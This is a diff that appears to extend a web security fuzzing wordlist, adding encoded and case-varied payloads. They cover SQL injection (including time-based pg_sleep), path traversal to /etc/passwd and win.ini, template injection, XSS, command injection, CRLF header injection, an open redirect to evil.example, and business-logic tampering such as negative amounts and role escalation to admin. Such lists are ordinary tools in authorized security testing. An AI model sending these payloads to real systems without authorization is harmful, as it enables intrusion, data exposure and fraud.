@@ -78,3 +78,164 @@ HTTPS://EXAMPLE.COM
 %2FAPI
 %2FAPI%2FV1
 %2FSTATUS
+{"amount":-1}
+%7B%22amount%22%3A-1%7D
+%257B%2522amount%2522%253A-1%257D
+{"AMOUNT":-1}
+{"amount":-1}?aurose=1
+{"amount":-1}&aurose=1
+{"amount":0}
+%7B%22amount%22%3A0%7D
+%257B%2522amount%2522%253A0%257D
+{"AMOUNT":0}
+{"amount":0}?aurose=1
+{"amount":0}&aurose=1
+{"amount":999999999}
+%7B%22amount%22%3A999999999%7D
+%257B%2522amount%2522%253A999999999%257D
+{"AMOUNT":999999999}
+{"amount":999999999}?aurose=1
+{"amount":999999999}&aurose=1
+{"price":0.01,"qty":99999}
+%7B%22price%22%3A0.01%2C%22qty%22%3A99999%7D
+%257B%2522price%2522%253A0.01%252C%2522qty%2522%253A99999%257D
+{"PRICE":0.01,"QTY":99999}
+{"price":0.01,"qty":99999}?aurose=1
+{"price":0.01,"qty":99999}&aurose=1
+{"coupon":"ALLFREE"}
+%7B%22coupon%22%3A%22ALLFREE%22%7D
+%257B%2522coupon%2522%253A%2522ALLFREE%2522%257D
+{"COUPON":"ALLFREE"}
+{"coupon":"ALLFREE"}?aurose=1
+{"coupon":"ALLFREE"}&aurose=1
+{"role":"admin"}
+%7B%22role%22%3A%22admin%22%7D
+%257B%2522role%2522%253A%2522admin%2522%257D
+{"ROLE":"ADMIN"}
+{"role":"admin"}?aurose=1
+{"role":"admin"}&aurose=1
+{"discount":101}
+%7B%22discount%22%3A101%7D
+%257B%2522discount%2522%253A101%257D
+{"DISCOUNT":101}
+{"discount":101}?aurose=1
+{"discount":101}&aurose=1
+{"balance":-1000}
+%7B%22balance%22%3A-1000%7D
+%257B%2522balance%2522%253A-1000%257D
+{"BALANCE":-1000}
+{"balance":-1000}?aurose=1
+{"balance":-1000}&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+{"amount":-1}::var0
+%7B%22amount%22%3A-1%7D::v0
+/business/probe/0
+{"amount":0}::var1
+%7B%22amount%22%3A0%7D::v1
+/business/probe/1
+{"amount":999999999}::var2
+%7B%22amount%22%3A999999999%7D::v2
+/business/probe/2
+{"price":0.01,"qty":99999}::var3
+%7B%22price%22%3A0.01%2C%22qty%22%3A99999%7D::v3
+/business/probe/3
+{"coupon":"ALLFREE"}::var4
+%7B%22coupon%22%3A%22ALLFREE%22%7D::v4
+/business/probe/4
+{"role":"admin"}::var5
+%7B%22role%22%3A%22admin%22%7D::v5
+/business/probe/5
+{"discount":101}::var6
+%7B%22discount%22%3A101%7D::v6
+/business/probe/6
+{"balance":-1000}::var7
+%7B%22balance%22%3A-1000%7D::v7
+/business/probe/7
+' OR '1'='1::var8
+%27%20OR%20%271%27%3D%271::v8
+/business/probe/8
+" OR "1"="1::var9
+%22%20OR%20%221%22%3D%221::v9
+/business/probe/9
+' AND 1=1 --::var10
+%27%20AND%201%3D1%20--::v10
+/business/probe/10
+' AND 1=2 --::var11
+%27%20AND%201%3D2%20--::v11
+/business/probe/11
